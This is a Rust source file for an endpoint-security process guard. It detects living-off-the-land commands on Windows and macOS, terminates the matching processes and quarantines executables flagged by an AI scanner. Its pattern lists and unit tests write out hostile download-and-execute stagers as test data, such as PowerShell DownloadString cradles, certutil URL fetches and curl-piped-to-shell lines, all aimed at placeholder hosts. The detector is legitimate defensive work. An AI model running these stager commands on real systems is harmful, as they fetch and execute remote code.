use crate::bin_ai::{self, BinaryAiScanner};
use crate::config::{AppConfig, Engine};
use crate::logger;
use crate::platform;
use crate::quarantine::{self, Severity, ThreatEvent};
use crate::status::Telemetry;
use std::collections::HashMap;
use std::ffi::OsStr;
use std::fs;
use std::panic::{self, AssertUnwindSafe};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use sysinfo::{Pid, Process, ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};

const POLL_INTERVAL: Duration = Duration::from_millis(400);
const EXIT_WAIT_ROUNDS: u32 = 15;
const EXIT_WAIT_STEP: Duration = Duration::from_millis(200);
const MAX_TRUST_CACHE: usize = 8192;
const CMDLINE_LOG_LIMIT: usize = 512;

pub const LOTL_PROCESSES: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "certutil.exe",
];

pub const LOTL_PATTERNS: &[&str] = &[
    "-enc ",
    "-ec ",
    "-encodedcommand",
    "invoke-expression",
    "iex ",
    "iex(",
    "downloadstring",
    "frombase64string",
    "-w hidden",
    "-windowstyle hidden",
    "-ep bypass",
    "certutil -urlcache",
];

/// Returns the first suspicious pattern for a script host, matching case- and
/// whitespace-insensitively with quote/caret obfuscation stripped.
pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
    let name = process_name.to_ascii_lowercase();
    if !LOTL_PROCESSES.contains(&name.as_str()) {
        return None;
    }
    let stripped: String = cmdline.chars().filter(|c| *c != '"' && *c != '^').collect();
    let mut normalized = stripped
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
        .replace("certutil.exe ", "certutil ");
    normalized.push(' ');
    LOTL_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
}

pub const MACOS_LOTL_PROCESSES: &[&str] = &["zsh", "bash", "sh", "osascript", "curl", "python3"];

pub const MACOS_LOTL_PATTERNS: &[&str] = &[
    "base64 -d",
    "base64 --decode",
    "b64decode",
    "osascript -e",
    "launchctl load",
    "chmod +x /tmp/",
    "chmod +x /private/tmp/",
];

pub const CURL_PIPE_SHELL: &str = "curl | sh";

/// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
fn curl_piped_to_shell(normalized: &str) -> bool {
    let stages: Vec<&str> = normalized.split(" | ").collect();
    let is_fetcher = |token: &str| {
        let tool = token.rsplit('/').next().unwrap_or(token);
        tool == "curl" || tool == "wget"
    };
    let Some(first_fetch) = stages
        .iter()
        .position(|stage| stage.split(' ').any(is_fetcher))
    else {
        return false;
    };
    stages[first_fetch + 1..].iter().any(|stage| {
        let mut tokens = stage.split(' ').filter(|t| !t.is_empty());
        let mut command = tokens.next();
        if command == Some("sudo") {
            command = tokens.next();
        }
        command
            .map(|c| c.rsplit('/').next().unwrap_or(c))
            .is_some_and(|c| matches!(c, "sh" | "bash" | "zsh"))
    })
}

/// macOS counterpart of [`match_lotl`]: shells, osascript, curl and python3 (any 3.x name).
pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static str> {
    let name = process_name.to_lowercase();
    let is_python = name == "python" || name.starts_with("python3");
    if !is_python && !MACOS_LOTL_PROCESSES.contains(&name.as_str()) {
        return None;
    }
    let unquoted: String = cmdline
        .chars()
        .filter(|c| *c != '"' && *c != '\'')
        .collect::<String>()
        .replace('|', " | ");
    let normalized = unquoted
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase();
    if curl_piped_to_shell(&normalized) {
        return Some(CURL_PIPE_SHELL);
    }
    MACOS_LOTL_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
}

/// Both rule sets: Windows script hosts and macOS shells/interpreters have disjoint names.
pub fn check_lotl_command(proc_name: &str, cmdline: &str) -> Option<&'static str> {
    match_lotl(proc_name, cmdline).or_else(|| match_lotl_macos(proc_name, cmdline))
}

fn refresh_kind() -> ProcessRefreshKind {
    ProcessRefreshKind::nothing()
        .with_cmd(UpdateKind::OnlyIfNotSet)
        .with_exe(UpdateKind::OnlyIfNotSet)
        .with_disk_usage()
}

fn process_name(process: &Process) -> String {
    OsStr::new(process.name()).to_string_lossy().into_owned()
}

fn command_line(process: &Process) -> String {
    process
        .cmd()
        .iter()
        .map(|arg| OsStr::new(arg).to_string_lossy().into_owned())
        .collect::<Vec<_>>()
        .join(" ")
}

pub struct ProcessGuard {
    cfg: Arc<AppConfig>,
    scanner: Arc<BinaryAiScanner>,
    telemetry: Arc<Telemetry>,
    sys: System,
    /// pid -> start time, so a recycled PID is treated as a new process.
    seen: HashMap<Pid, u64>,
    trust_cache: HashMap<PathBuf, (u64, bool)>,
}

impl ProcessGuard {
    pub fn new(
        cfg: Arc<AppConfig>,
        scanner: Arc<BinaryAiScanner>,
        telemetry: Arc<Telemetry>,
    ) -> Self {
        Self {
            cfg,
            scanner,
            telemetry,
            sys: System::new(),
            seen: HashMap::new(),
            trust_cache: HashMap::new(),
        }
    }

    pub fn poll(&mut self) {
        if !self.cfg.engine_enabled(Engine::ProcessGuard) {
            // Forget everything so re-enabling inspects what is running at that moment.
            self.seen.clear();
            self.telemetry.processes_watched.store(0, Ordering::Relaxed);
            return;
        }
        self.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let mut fresh = Vec::new();
        for (pid, process) in self.sys.processes() {
            let started = process.start_time();
            if self.seen.get(pid) != Some(&started) {
                self.seen.insert(*pid, started);
                fresh.push(*pid);
            }
        }
        let live = self.sys.processes();
        self.seen.retain(|pid, _| live.contains_key(pid));
        self.telemetry
            .processes_watched
            .store(live.len() as u64, Ordering::Relaxed);
        self.telemetry
            .processes_inspected
            .fetch_add(fresh.len() as u64, Ordering::Relaxed);
        for pid in fresh {
            self.inspect(pid);
        }
    }

    fn inspect(&mut self, pid: Pid) {
        let Some(process) = self.sys.process(pid) else {
            return;
        };
        let name = process_name(process);
        if platform::is_protected_process(pid.as_u32(), &name) {
            return;
        }
        let cmdline = command_line(process);
        let exe = process.exe().map(Path::to_path_buf);
        if let Some(pattern) = check_lotl_command(&name, &cmdline) {
            self.respond_lotl(pid, &name, &cmdline, pattern);
            return;
        }
        if let Some(exe) = exe {
            if self.cfg.engine_enabled(Engine::BinAi) {
                self.scan_executable(pid, &name, &exe);
            }
        }
    }

    fn respond_lotl(&mut self, pid: Pid, name: &str, cmdline: &str, pattern: &str) {
        let action = if self.cfg.is_dry_run() {
            "DRY_RUN: would terminate process".to_string()
        } else if self.sys.process(pid).is_some_and(|p| p.kill()) {
            "TERMINATED".to_string()
        } else {
            "TERMINATE_FAILED".to_string()
        };
        quarantine::record_event(
            &self.cfg,
            ThreatEvent::new(
                "LOTL_SCRIPT",
                Severity::High,
                format!("{name} (pid {})", pid.as_u32()),
                action,
                format!(
                    "pattern=\"{}\" cmdline=\"{}\"",
                    pattern.trim(),
                    quarantine::truncate_chars(cmdline, CMDLINE_LOG_LIMIT)
                ),
            ),
        );
    }

    fn is_trusted(&mut self, exe: &Path) -> bool {
        let mtime = fs::metadata(exe)
            .map(|m| bin_ai::modified_secs(&m))
            .unwrap_or(0);
        if let Some(&(cached_mtime, trusted)) = self.trust_cache.get(exe) {
            if cached_mtime == mtime {
                return trusted;
            }
        }
        let trusted = platform::is_trusted_binary(exe);
        if self.trust_cache.len() >= MAX_TRUST_CACHE {
            self.trust_cache.clear();
        }
        self.trust_cache.insert(exe.to_path_buf(), (mtime, trusted));
        trusted
    }

    fn scan_executable(&mut self, pid: Pid, name: &str, exe: &Path) {
        if !exe.is_file() || self.is_trusted(exe) {
            return;
        }
        let Some(score) = self.scanner.scan_file(exe) else {
            return;
        };
        if score < self.cfg.ai_threshold {
            return;
        }
        let details = format!(
            "pid={} name={name} {}",
            pid.as_u32(),
            self.scanner.explain(exe, score, self.cfg.ai_threshold)
        );
        let action = if self.cfg.is_dry_run() {
            "DRY_RUN: would terminate process and quarantine executable".to_string()
        } else {
            let killed = self.kill_all_with_exe(exe);
            self.wait_for_exit(&killed);
            let quarantined =
                match quarantine::quarantine_file(exe, &self.cfg, "MALWARE_AI_PROCESS", &details) {
                    Ok(meta) => format!("QUARANTINED id={}", meta.id),
                    Err(e) => format!("QUARANTINE_FAILED: {e}"),
                };
            format!("TERMINATED {} process(es); {quarantined}", killed.len())
        };
        quarantine::record_event(
            &self.cfg,
            ThreatEvent::new(
                "MALWARE_AI_PROCESS",
                Severity::Critical,
                exe.display().to_string(),
                action,
                details,
            ),
        );
    }

    fn kill_all_with_exe(&self, exe: &Path) -> Vec<Pid> {
        let target = platform::path_key(exe);
        let mut killed = Vec::new();
        for (pid, process) in self.sys.processes() {
            let same_image = process
                .exe()
                .is_some_and(|candidate| platform::path_key(candidate) == target);
            if same_image
                && !platform::is_protected_process(pid.as_u32(), &process_name(process))
                && process.kill()
            {
                killed.push(*pid);
            }
        }
        killed
    }

    fn wait_for_exit(&mut self, pids: &[Pid]) {
        if pids.is_empty() {
            return;
        }
        for _ in 0..EXIT_WAIT_ROUNDS {
            self.sys
                .refresh_processes(ProcessesToUpdate::Some(pids), true);
            if pids.iter().all(|pid| self.sys.process(*pid).is_none()) {
                return;
            }
            thread::sleep(EXIT_WAIT_STEP);
        }
    }
}

pub fn run(
    cfg: Arc<AppConfig>,
    scanner: Arc<BinaryAiScanner>,
    telemetry: Arc<Telemetry>,
    shutdown: Arc<AtomicBool>,
) {
    let mut guard = ProcessGuard::new(cfg, scanner, telemetry);
    logger::info("process guard active");
    while !shutdown.load(Ordering::SeqCst) {
        if panic::catch_unwind(AssertUnwindSafe(|| guard.poll())).is_err() {
            logger::error("process guard recovered from a panic");
        }
        thread::sleep(POLL_INTERVAL);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_encoded_and_download_cradles() {
        assert_eq!(
            match_lotl("powershell.exe", "powershell.exe -NoP -Enc SQBFAFgA"),
            Some("-enc ")
        );
        assert_eq!(
            match_lotl("PowerShell.EXE", "powershell -EncodedCommand ZQBjAGgAbwA="),
            Some("-encodedcommand")
        );
        assert!(match_lotl(
            "pwsh.exe",
            "pwsh -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
        )
        .is_some());
        assert!(match_lotl("powershell.exe", "powershell -W Hidden -File x.ps1").is_some());
        assert!(match_lotl("powershell.exe", "powershell -ep   bypass -f a.ps1").is_some());
        assert!(match_lotl(
            "powershell.exe",
            "powershell [Convert]::FromBase64String($s)"
        )
        .is_some());
        assert!(match_lotl("powershell.exe", "powershell -c iex").is_some());
    }

    #[test]
    fn flags_cmd_and_certutil_variants() {
        assert_eq!(
            match_lotl(
                "cmd.exe",
                "cmd /c c^e^r^t^u^t^i^l -urlcache -split -f http://x/a.exe"
            ),
            Some("certutil -urlcache")
        );
        assert_eq!(
            match_lotl(
                "certutil.exe",
                "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://x/p a.exe"
            ),
            Some("certutil -urlcache")
        );
        assert!(match_lotl("mshta.exe", "mshta vbscript:Execute(\"x\") -w hidden").is_some());
    }

    #[test]
    fn ignores_benign_commands_and_other_processes() {
        assert_eq!(
            match_lotl("powershell.exe", "powershell -NoProfile -File build.ps1"),
            None
        );
        assert_eq!(match_lotl("cmd.exe", "cmd /c npm run build"), None);
        assert_eq!(
            match_lotl("powershell.exe", "powershell Get-ChildItem -Recurse"),
            None
        );
        assert_eq!(match_lotl("notepad.exe", "notepad -enc x"), None);
        assert_eq!(match_lotl("code.exe", "code --windowstyle hidden"), None);
    }

    #[test]
    fn macos_flags_download_and_decode_stagers() {
        assert_eq!(
            match_lotl_macos("bash", "bash -c 'curl -fsSL http://x/p.sh | sh'"),
            Some(CURL_PIPE_SHELL)
        );
        assert_eq!(
            match_lotl_macos("zsh", "zsh -c curl -s http://x|sudo /bin/bash"),
            Some(CURL_PIPE_SHELL)
        );
        assert_eq!(
            match_lotl_macos("sh", "sh -c echo ZWNobyBoaQ== | base64 -D | sh"),
            Some("base64 -d")
        );
        assert_eq!(
            match_lotl_macos("osascript", "osascript -e do shell script \"id\""),
            Some("osascript -e")
        );
        assert_eq!(
            match_lotl_macos(
                "bash",
                "bash -c launchctl load ~/Library/LaunchAgents/x.plist"
            ),
            Some("launchctl load")
        );
        assert_eq!(
            match_lotl_macos("sh", "sh -c chmod +x /tmp/payload && /tmp/payload"),
            Some("chmod +x /tmp/")
        );
        assert_eq!(
            match_lotl_macos(
                "Python3.12",
                "python3 -c import base64;exec(base64.b64decode('aW1wb3J0IG9z'))"
            ),
            Some("b64decode")
        );
    }

    #[test]
    fn macos_ignores_benign_commands_and_other_processes() {
        assert_eq!(match_lotl_macos("zsh", "zsh -c ls -la | grep foo"), None);
        assert_eq!(
            match_lotl_macos(
                "curl",
                "curl -fsSL -o setup.pkg https://example.com/setup.pkg"
            ),
            None
        );
        assert_eq!(
            match_lotl_macos(
                "bash",
                "bash -c curl -s https://x/sums.txt | shasum -a 256 -c"
            ),
            None
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip"
            ),
            None
        );
        assert_eq!(match_lotl_macos("Safari", "Safari -e x"), None);
        assert_eq!(
            match_lotl_macos("powershell.exe", "powershell -enc x"),
            None
        );
        assert_eq!(match_lotl("zsh", "zsh -c curl x | sh"), None);
    }

    #[test]
    fn unified_matcher_covers_both_platforms() {
        for (name, cmdline) in [
            ("powershell.exe", "powershell.exe -w hidden -enc SQBFAFgA"),
            ("powershell.exe", "powershell -ep bypass iex (iwr http://x)"),
            (
                "certutil.exe",
                "certutil -urlcache -split -f http://x/a.exe",
            ),
            ("sh", "sh -c \"curl http://x | sh\""),
            ("osascript", "osascript -e 'do shell script \"id\"'"),
            ("bash", "bash -c echo aWQ= | base64 -D"),
        ] {
            assert!(
                check_lotl_command(name, cmdline).is_some(),
                "{name}: {cmdline}"
            );
        }
        for (name, cmdline) in [
            ("powershell.exe", "powershell.exe -Command Get-Date"),
            ("git.exe", "git status"),
            ("git", "git status"),
            ("cargo.exe", "cargo build"),
            ("zsh", "zsh -c cargo build"),
        ] {
            assert_eq!(check_lotl_command(name, cmdline), None, "{name}: {cmdline}");
        }
    }
}
